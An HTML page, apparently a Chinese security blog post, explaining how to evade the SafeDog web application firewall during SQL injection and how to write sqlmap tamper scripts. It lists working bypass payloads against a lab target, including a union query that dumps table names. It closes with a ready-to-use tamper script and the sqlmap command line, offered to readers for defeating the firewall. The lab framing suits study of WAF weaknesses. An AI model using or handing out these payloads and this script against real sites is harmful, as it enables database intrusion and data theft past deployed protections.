@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>简单的从绕狗到编写tamper | Zeo's Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="@[TOC] 0x00 简述 安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的 但是实际情况是需要权衡可用性和安全性 当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截 所以最终就是正则的绕过 注意： 版本不同，他的正则规则也是不一样的 所以有的payload在新老版本是不能同吃。 但是没有关系，你学会这么绕，这都不是问题。  0x01 首先我们要判断哪个关键字被拦截了我们以 o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单的从绕狗到编写tamper">
+<meta property="og:url" content="https://godzeo.github.io/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/index.html">
+<meta property="og:site_name" content="Zeo&#39;s Security Lab">
+<meta property="og:description" content="@[TOC] 0x00 简述 安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的 但是实际情况是需要权衡可用性和安全性 当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截 所以最终就是正则的绕过 注意： 版本不同，他的正则规则也是不一样的 所以有的payload在新老版本是不能同吃。 但是没有关系，你学会这么绕，这都不是问题。  0x01 首先我们要判断哪个关键字被拦截了我们以 o">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-21T01:23:23.000Z">
+<meta property="article:modified_time" content="2020-05-25T08:04:24.623Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://godzeo.github.io/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '简单的从绕狗到编写tamper',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-05-25 16:04:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">简单的从绕狗到编写tamper</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-21T01:23:23.000Z" title="发表于 2020-04-21 09:23:23">2020-04-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-05-25T08:04:24.623Z" title="更新于 2020-05-25 16:04:24">2020-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="简单的从绕狗到编写tamper"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
+
+<p>@[TOC]</p>
+<h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul>
+<li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li>
+<li>但是实际情况是需要权衡可用性和安全性</li>
+<li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li>
+<li>所以最终就是正则的绕过</li>
+<li>注意：</li>
+<li>版本不同，他的正则规则也是不一样的</li>
+<li>所以有的payload在新老版本是不能同吃。</li>
+<li>但是没有关系，你学会这么绕，这都不是问题。</li>
+</ul>
+<h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p>
+<p>提供思路就是破坏单词去测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/Less-2/?id=1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http://10.211.55.4/Less-2/?id=1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http://10.211.55.4/Less-2/?id=1 order bay 3 （破坏了by 没有拦截）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以狗拦截的东西就是 order by 两个一起出现</p>
+<p>所有后面的测试都是按照这个思路初步的判断。</p>
+<h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul>
+<li>绕过的一些基础</li>
+<li>MySql注释内语句也可执行（&#x2F;*! *&#x2F;）</li>
+<li><code>/*! ....*/</code> 在其他很多地方都是注释。</li>
+<li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!50001 select * from test */;</span><br></pre></td></tr></table></figure>
+
+<p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p>
+<ul>
+<li>Mysql常用的符号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure>
+
+<p>还有一些bypass的常用注释符号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/</span><br><span class="line">/*letmetest*/</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul>
+<li>and 1</li>
+<li>只要and后面接数字，安全狗就会拦截</li>
+<li>order by</li>
+<li>order 后面接by，安全狗就会拦截</li>
+<li>union select</li>
+<li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li>
+<li>database()</li>
+<li>database后面接括号，安全狗就会拦截</li>
+</ul>
+<p>下面是测试成功的例子</p>
+<p>order by 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http://10.211.55.4/Less-2/?id=1 order %23a%0aby 3</span><br></pre></td></tr></table></figure>
+
+<p>union select绕过 同理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/Less-2/?id=-1 union %23a%0a/*!select*/ 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>database()绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/Less-2/?id=-1 union %23a%0a/*!select*/ 1,%23a%0adatabase/*!*/(),3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一个完整的union查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/Less-2/?id=-1 union %23a%0a/*!select*/ 1,group_concat(table_name),3 %23a%0a/*!from*/ information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有一种注释版本号的 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/Less-2/?id=-1 union /*!44466select*/ 1,database/*!()*/,3</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p>
+<p>为了好理解直接典例深刨析：</p>
+<p>我们理解一下一个常用的tamper ：space2comment.py </p>
+<p>这个脚本的功能就是：用“&#x2F;**&#x2F;”替换空格符</p>
+<p>下面是完整的代码</p>
+<pre><code>#!/usr/bin/env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
+See the file &#39;LICENSE&#39; for copying permission
+&quot;&quot;&quot;
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+    &#39;SELECT/**/id/**/FROM/**/users&#39;
+    &quot;&quot;&quot;
+
+    retVal = payload
+
+    if payload:
+        retVal = &quot;&quot;
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += &quot;/**/&quot;
+                    continue
+
+            elif payload[i] == &#39;\&#39;&#39;:
+                quote = not quote
+
+            elif payload[i] == &#39;&quot;&#39;:
+                doublequote = not doublequote
+
+            elif payload[i] == &quot; &quot; and not doublequote and not quote:
+                retVal += &quot;/**/&quot;
+                continue
+
+            retVal += payload[i]
+
+    return retVal
+</code></pre>
+<p>​    </p>
+<h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 tamper主要的三个部分</h1><ul>
+<li>第一部分priority</li>
+<li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li>
+<li>第二部分dependencies函数</li>
+<li>该脚本适用&#x2F;不适用的范围，也可以不写。</li>
+<li>第三部分tamper函数</li>
+<li>主要就是我们绕过的精华，要替换的内容。</li>
+</ul>
+<p>priority优先级</p>
+<p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ = PRIORITY.LOW</span><br></pre></td></tr></table></figure>
+
+<p>有大概七个等级  LOWEST LOWER &#x3D; LOW NORMAL HIGH HIGHER  HIGHEST</p>
+<p>dependencies函数主要是提示用户适用范围</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>tamper是重头戏</p>
+<p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p>
+<p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#x27;union&#x27;,&#x27;uniounionn&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p>
+<h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p>
+<ul>
+<li><p>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</p>
+</li>
+<li><p>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</p>
+</li>
+<li><p>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</p>
+</li>
+<li><p>还有调试过程中 要打开–flush 参数刷新缓存</p>
+</li>
+<li><p>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</p>
+</li>
+<li><p>例如会用到的相似的函数：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER/*!*/() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>下面是我的绕过参数：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://10.211.55.4/Less-2/?id=1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech=U</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload=payload.replace(&#x27;AND&#x27;,&#x27;/*!44466AND*/&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;ORDER&#x27;,&#x27;/*!44466order*/&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;BY&#x27;,&#x27;%23a%0aby&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;USER()&#x27;,&#x27;%23a%0aUSER/*!*/()&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;DATABASE()&#x27;,&#x27;%23a%0aDATABASE/*!*/()&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;SESSION_%23a%0aUSER/*!*/()&#x27;,&#x27;%23a%0aSESSION_USER()&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;UNION ALL SELECT&#x27;,&#x27;UNION ALL /*!44466SELECT*/&#x27;)</span><br><span class="line">    payload=payload.replace(&#x27;CURRENT_%23a%0aUSER/*!*/()&#x27;,&#x27;CURRENT_USER()&#x27;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终绕过安全狗成功跑出数据</p>
+<p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://godzeo.github.io">Zeo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://godzeo.github.io/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/">https://godzeo.github.io/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://godzeo.github.io" target="_blank">Zeo's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">从绕过安全狗到编写tamper脚本</div></div></a></div><div class="next-post pull-right"><a href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次360众测仿真实战靶场考核WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/" title="google hack搜索引擎常用总结"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-26</div><div class="title">google hack搜索引擎常用总结</div></div></a></div><div><a href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/" title="从绕过安全狗到编写tamper脚本"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-21</div><div class="title">从绕过安全狗到编写tamper脚本</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x00 简述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E8%A6%81%E5%88%A4%E6%96%AD%E5%93%AA%E4%B8%AA%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E6%8B%A6%E6%88%AA%E4%BA%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 首先我们要判断哪个关键字被拦截了</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">0x02 一些简单的知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93%E5%AE%89%E5%85%A8%E7%8B%97%E6%8B%A6%E6%88%AA%E7%9A%84%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结安全狗拦截的点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Sqlmap-tamper%E7%9A%84%E7%BC%96%E5%86%99"><span class="toc-number">5.</span> <span class="toc-text">0x04 Sqlmap tamper的编写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-tamper%E4%B8%BB%E8%A6%81%E7%9A%84%E4%B8%89%E4%B8%AA%E9%83%A8%E5%88%86"><span class="toc-number">6.</span> <span class="toc-text">0x05 tamper主要的三个部分</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-tamper%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">0x06 tamper编写测试方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%BB%93%E6%9D%9F"><span class="toc-number">8.</span> <span class="toc-text">0x07 结束</span></a></li></ol></div></div><div 